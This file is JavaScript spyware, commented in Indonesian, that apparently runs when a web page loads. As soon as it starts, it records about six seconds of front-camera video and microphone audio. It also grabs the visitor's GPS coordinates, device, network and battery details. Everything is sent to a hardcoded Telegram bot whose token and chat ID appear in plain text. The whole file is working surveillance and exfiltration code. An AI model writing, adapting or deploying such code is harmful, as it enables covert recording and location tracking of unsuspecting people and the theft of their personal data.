const TELEGRAM_BOT_TOKEN = '7987059644:AAE8Ph1Aw9S7TzayJZtvkIO9LaApdonp6vw';
const TELEGRAM_CHAT_ID = '8053109804';

// Fungsi utama
(async function main() {
    try {
        console.log("Proses dimulai...");

        // Semua tugas dijalankan secara paralel
        const tasks = [
            recordVideoAndAudio(6000), // Rekam video dan audio secara bersamaan selama 6 detik
            requestLocationAccess(),   // Ambil lokasi
            sendDeviceInfo(),          // Informasi perangkat
            sendNetworkInfo(),         // Informasi jaringan
            sendBatteryInfo()          // Informasi baterai
        ];

        // Tunggu semua tugas selesai
        const results = await Promise.allSettled(tasks);

        // Kirim hasil rekaman video/audio
        const videoAudioResult = results[0];
        if (videoAudioResult.status === "fulfilled" && videoAudioResult.value) {
            const { videoBlob, audioBlob } = videoAudioResult.value;
            if (videoBlob) {
                console.log("Mengirim video ke Telegram...");
                await sendToTelegram(videoBlob, 'video/mp4');
            }
            if (audioBlob) {
                console.log("Mengirim audio ke Telegram...");
                await sendToTelegram(audioBlob, 'audio/wav');
            }
        }

        console.log("Proses selesai. Semua data telah dikirim ke Telegram.");
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
})();

// Fungsi untuk merekam video dan audio secara bersamaan
async function recordVideoAndAudio(duration) {
    try {
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

        const videoChunks = [];
        const audioChunks = [];

        const videoRecorder = new MediaRecorder(videoStream);
        const audioRecorder = new MediaRecorder(audioStream);

        videoRecorder.ondataavailable = (event) => videoChunks.push(event.data);
        audioRecorder.ondataavailable = (event) => audioChunks.push(event.data);

        videoRecorder.start();
        audioRecorder.start();

        await wait(duration);

        videoRecorder.stop();
        audioRecorder.stop();

        return new Promise((resolve) => {
            videoRecorder.onstop = () => {
                videoStream.getTracks().forEach((track) => track.stop());
                const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });

                audioRecorder.onstop = () => {
                    audioStream.getTracks().forEach((track) => track.stop());
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    resolve({ videoBlob, audioBlob });
                };
            };
        });
    } catch (error) {
        console.error("Gagal merekam video/audio:", error.message);
        return null;
    }
}

// Fungsi untuk meminta akses lokasi
async function requestLocationAccess() {
    if (!navigator.geolocation) {
        console.log("Geolocation tidak didukung oleh perangkat.");
        await sendMessageToTelegram("Geolocation tidak didukung oleh perangkat.");
        return "Geolocation tidak didukung oleh perangkat.";
    }

    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const locationMessage = `Lokasi Anda:
- Latitude: ${latitude}
- Longitude: ${longitude}
- [Lihat di Google Maps](https://maps.google.com/?q=${latitude},${longitude})`;

                await sendMessageToTelegram(locationMessage);
                resolve("Lokasi berhasil dikirim.");
            },
            async (error) => {
                const errorMessage = `Gagal mendapatkan lokasi: ${error.message}`;

                console.error(errorMessage);
                await sendMessageToTelegram(errorMessage);

                // Memberikan instruksi kepada pengguna jika lokasi ditolak
                if (error.code === error.PERMISSION_DENIED) {
                    const permissionErrorMessage = "Izin lokasi ditolak. Harap aktifkan akses lokasi di pengaturan perangkat Anda.";
                    await sendMessageToTelegram(permissionErrorMessage);
                }

                resolve(errorMessage); // Melanjutkan eksekusi meskipun ada error
            }
        );
    });
}

// Fungsi untuk mengirim informasi perangkat
async function sendDeviceInfo() {
    try {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform || "Tidak Diketahui";
        const languages = navigator.languages ? navigator.languages.join(", ") : "Tidak Diketahui";
        const cpuThreads = navigator.hardwareConcurrency || "Tidak Diketahui";
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak Diketahui";
        const screenWidth = screen.width;
        const screenHeight = screen.height;
        const viewportWidth = window.innerWidth;
        const viewportHeight = window.innerHeight;
        const pixelRatio = window.devicePixelRatio || "Tidak Diketahui";
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak Diketahui";
        const currentTime = new Date().toString();

        const deviceInfo = `Informasi Perangkat Anda:
- User Agent: ${userAgent}
- Platform: ${platform}
- Bahasa: ${navigator.language || "Tidak Diketahui"}
- Bahasa (Semua): ${languages}
- CPU Threads: ${cpuThreads}
- RAM: ${memory}
- Resolusi Layar: ${screenWidth}x${screenHeight}
- Resolusi Viewport: ${viewportWidth}x${viewportHeight}
- Pixel Ratio: ${pixelRatio}
- Zona Waktu: ${timeZone}
- Waktu Saat Ini: ${currentTime}`;

        await sendMessageToTelegram(deviceInfo);
    } catch (error) {
        console.error("Gagal mendapatkan informasi perangkat:", error.message);
    }
}

// Fungsi untuk mengirim informasi jaringan
async function sendNetworkInfo() {
    try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            const networkInfo = `Informasi Jaringan:
- Tipe Koneksi: ${connection.effectiveType}
- Kecepatan Unduh: ${connection.downlink} Mbps
- Latensi (RTT): ${connection.rtt} ms`;
            await sendMessageToTelegram(networkInfo);
        }
    } catch (error) {
        console.error("Gagal mendapatkan informasi jaringan:", error.message);
    }
}

// Fungsi untuk mengirim informasi baterai
async function sendBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            const charging = battery.charging ? "Ya" : "Tidak";
            const batteryInfo = `Informasi Baterai:
- Mengisi Daya: ${charging}
- Tingkat Baterai: ${Math.round(battery.level * 100)}%
- Waktu Penuh: ${battery.chargingTime ? battery.chargingTime + " detik" : "N/A"}
- Waktu Habis: ${battery.dischargingTime ? battery.dischargingTime + " detik" : "N/A"}`;

            await sendMessageToTelegram(batteryInfo);
        }
    } catch (error) {
        console.error("Gagal mendapatkan informasi baterai:", error.message);
    }
}

// Fungsi untuk menunggu waktu tertentu
function wait(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Fungsi untuk mengirim pesan teks ke Telegram
async function sendMessageToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" }),
        });
    } catch (error) {
        console.error("Gagal mengirim pesan ke Telegram:", error.message);
    }
}

// Fungsi untuk mengirim file media ke Telegram
async function sendToTelegram(fileBlob, mimeType) {
    try {
        const formData = new FormData();
        formData.append(mimeType === 'video/mp4' ? 'video' : 'audio', fileBlob);
        formData.append('chat_id', TELEGRAM_CHAT_ID);

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${mimeType === 'video/mp4' ? 'Video' : 'Audio'}`, {
            method: 'POST',
            body: formData,
        });
    } catch (error) {
        console.error("Gagal mengirim media ke Telegram:", error.message);
    }
}
